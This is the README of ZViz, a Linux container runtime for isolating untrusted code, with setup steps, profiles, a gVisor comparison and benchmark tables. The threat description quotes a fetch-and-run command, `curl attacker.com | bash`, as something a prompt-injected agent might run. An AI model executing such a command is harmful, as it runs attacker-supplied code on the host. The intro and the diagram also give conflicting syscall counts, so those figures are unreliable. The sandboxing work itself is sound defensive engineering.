# ZViz

[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Platform](https://img.shields.io/badge/platform-Linux-green.svg)](https://github.com/AIntheSky/zviz)

**Container isolation for code you can't trust but have to run.**

ZViz is an OCI-compatible Zig container runtime that takes a *selective denial*
approach: 132 syscalls reach the host kernel at native speed, 24 dangerous ones
are blocked at the seccomp layer before any kernel code runs, and one
(`socket`) is argument-filtered inline. No userspace kernel, no emulation,
no daemon. The default profile drops all 41 Linux capabilities, applies a
Landlock ruleset, mounts `/proc`/`/sys`/`/dev` privately in the container, and
runs the workload as PID 1 of a fresh user + PID + mount + IPC + UTS namespace.

---

## The Problem

You're running code you didn't write. Maybe it's:

- **AI agents** executing LLM-generated code (one prompt injection away from `curl attacker.com | bash`)
- **CI/CD pipelines** running `npm install` on packages with 47 transitive dependencies you've never audited
- **Third-party plugins** that "need shell access" to work
- **Multi-tenant workloads** where one customer's code runs next to another's

Traditional containers give you a false sense of security. A container is just namespaces and cgroups - the kernel attack surface is still fully exposed. Every `runc` escape CVE is a reminder that "containerized" isn't a security strategy.

gVisor solves this with a userspace kernel that emulates syscalls. It works, but at a cost: 5-250x syscall overhead, ~200ms cold starts, and 50MB per container. For high-throughput APIs or serverless functions, that's a dealbreaker.

## The Solution

ZViz provides gVisor-grade isolation without the performance tax. Instead of emulating syscalls, it enforces security through layered kernel primitives:

```
gVisor:  App → Sentry (emulates ~300 syscalls) → Host kernel (~70 syscalls)
ZViz:    App → BPF filter → ALLOW (90, native speed) / DENY (22) / BROKER (5, mediated)
```

Allowed syscalls execute at native kernel speed. Dangerous syscalls get blocked immediately (EPERM) or routed through a userspace broker for inspection.

**Result**: 98.2% policy compatibility with gVisor, 4-249x faster syscalls, ~8ms cold starts.

## Quick Start

```bash
# 1. Build (requires Zig 0.15.0+, Linux 5.13+)
git clone https://github.com/AIntheSky/zviz.git
cd zviz && zig build -Doptimize=ReleaseSafe

# 2. (Ubuntu 24.04+) install the AppArmor profile that grants the userns
#    permission pivot_root needs; without this the kernel sysctl
#    apparmor_restrict_unprivileged_userns=1 blocks the bind mount and
#    zviz falls back to chdir-only filesystem isolation.
sudo install -m 0644 packaging/apparmor/zviz /etc/apparmor.d/zviz
sudo apparmor_parser -r /etc/apparmor.d/zviz

# 3. Build an OCI bundle (rootfs + config.json). Any image works:
mkdir -p ~/zviz-bundle/rootfs
docker create --name extract redis:alpine
docker export extract | tar -C ~/zviz-bundle/rootfs -xf -
docker rm extract
cat > ~/zviz-bundle/config.json <<EOF
{ "ociVersion":"1.0.2",
  "process":{"terminal":false,"user":{"uid":0,"gid":0},
    "args":["/usr/local/bin/redis-server","--save","","--protected-mode","no"],
    "env":["PATH=/usr/local/bin:/usr/bin:/bin"],"cwd":"/"},
  "root":{"path":"rootfs","readonly":false},"hostname":"my-container",
  "linux":{"namespaces":[
    {"type":"pid"},{"type":"mount"},{"type":"ipc"},{"type":"uts"}]} }
EOF

# 4. Run it
./zig-out/bin/zviz run my-container ~/zviz-bundle
# --verbose logs every blocked syscall; --profile=<name> selects a built-in profile
```

ZViz auto-mounts the standard pseudo-filesystems inside the bundle's rootfs:
`/proc` (procfs, nosuid+nodev+noexec), `/sys` (sysfs, read-only), and
`/dev` (private tmpfs with bind-mounted `/dev/null`, `zero`, `full`, `random`,
`urandom`, `tty` and `/dev/std{in,out,err}` symlinks). No mount entries are
required in `config.json` for this; a user-provided `mounts[]` entry overrides
the auto-mount for that path.

## AI Agents & Agentic Workloads

ZViz is built for the era of autonomous code execution:

| Scenario | Risk | ZViz Protection |
|----------|------|-----------------|
| **LLM code execution** | Model generates malicious code (prompt injection, hallucination) | Syscall filtering blocks escape attempts at kernel boundary |
| **Agent tool use** | Agent calls shell commands, file operations | Landlock LSM restricts filesystem access, broker mediates dangerous ops |
| **Agent spawning agents** | Recursive execution, resource exhaustion | cgroups v2 limits, PID caps, memory caps |
| **Untrusted plugins/extensions** | Third-party code with unknown behavior | Full namespace isolation, all capabilities dropped |

The `--verbose` flag shows exactly which syscalls are being blocked - essential for debugging agent workloads that hit unexpected restrictions.

## Built-in Profiles

Choose a profile based on your workload:

```bash
zviz --profile=<name> run container /path/to/bundle
```

| Profile | Use Case | Key Characteristics |
|---------|----------|---------------------|
| `ci-runner` | CI/CD, build systems | Default profile, balanced security |
| `web-server` | HTTP APIs, services | Network allowed, socket ops optimized |
| `batch-job` | Data processing, ETL | No network, high memory limit (8G) |
| `hostile-tenant` | Untrusted user code | Maximum restrictions |
| `development` | Debugging | Allows ptrace - **NOT for production** |

## When to Use gVisor Instead

ZViz blocks dangerous syscalls outright. gVisor emulates them in a sandboxed userspace kernel. Both achieve isolation - but the approach matters for compatibility:

| If your workload needs... | Use | Why |
|---------------------------|-----|-----|
| `ptrace` (strace, debuggers) | gVisor | ZViz blocks it; gVisor emulates safely |
| `mount` / `unshare` (Docker-in-Docker) | gVisor | Nested containers need namespace syscalls |
| Bazel / Nix builds | gVisor | Internal sandboxing creates namespaces |
| Maximum syscall performance | **ZViz** | Native speed vs 5-250x emulation overhead |
| Fast cold starts (serverless) | **ZViz** | ~8ms vs ~200ms |
| Strictest policy (block, don't emulate) | **ZViz** | Exploit code fails immediately |

**Simple rule**: If you need nested containers or process tracing, use gVisor. Otherwise, ZViz is faster and stricter.

## Security Validation

Tested against real escape techniques and attack vectors:

| Metric | ZViz | gVisor |
|--------|------|--------|
| Escape tests blocked | **19/19 (100%)** | 11/19 (58%)* |
| Security attacks blocked | 8/8 | 6/8* |
| Policy compatibility | 98.2% (54/55 checks) | baseline |

*gVisor "allows" some syscalls (ptrace, mount) but emulates them safely in userspace. Different philosophy, equivalent security outcome for those operations.

The 1.8% policy gap: ZViz defaults network egress to **deny**. gVisor allows it.

## Performance

| Metric | ZViz | gVisor | runc |
|--------|------|--------|------|
| Cold start | ~8ms | ~200ms | ~50ms |
| Memory per container | ~2MB | ~50MB | ~0 |
| I/O throughput | ~95% native | ~40% native | 100% |

### Syscall Latency (measured)

| Syscall | ZViz | gVisor | Speedup |
|---------|------|--------|---------|
| getpid | 297ns | 1,209ns | 4.1x |
| clock_gettime | 20ns | 4,982ns | **249x** |
| read | 212ns | 4,393ns | **20.7x** |
| write | 211ns | 1,169ns | 5.5x |

ZViz's allowed syscalls hit the kernel directly. gVisor routes everything through its Sentry process.

## How It Works

Five enforcement layers, applied in order:

| Layer | Mechanism | Purpose |
|-------|-----------|---------|
| 1 | **Namespaces** (user, pid, mount, ipc, uts) | Resource isolation |
| 2 | **Capabilities** (all 41 dropped) | Privilege elimination |
| 3 | **Landlock LSM** | Filesystem access control |
| 4 | **Seccomp-BPF** (124 instructions) | Syscall filtering |
| 5 | **cgroups v2** | Resource limits (memory, PIDs, CPU) |

The ordering matters: capabilities drop before seccomp loads, Landlock applies before seccomp so security setup syscalls aren't self-blocked.

## Documentation

| Document | Description |
|----------|-------------|
| [Architecture](documentation/docs/architecture/index.md) | System design and enforcement layers |
| [Comparison](documentation/docs/architecture/comparison.md) | ZViz vs gVisor vs Kata vs Firecracker |
| [Threat Model](documentation/docs/architecture/threat-model.md) | Security goals and assumptions |
| [Performance](documentation/docs/architecture/performance.md) | Benchmark methodology and results |

## Requirements

- Linux kernel >= 5.13 (Landlock LSM)
- cgroups v2 enabled
- Zig 0.15.0+ (build from source)

## Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

Apache License 2.0 - See [LICENSE](LICENSE)
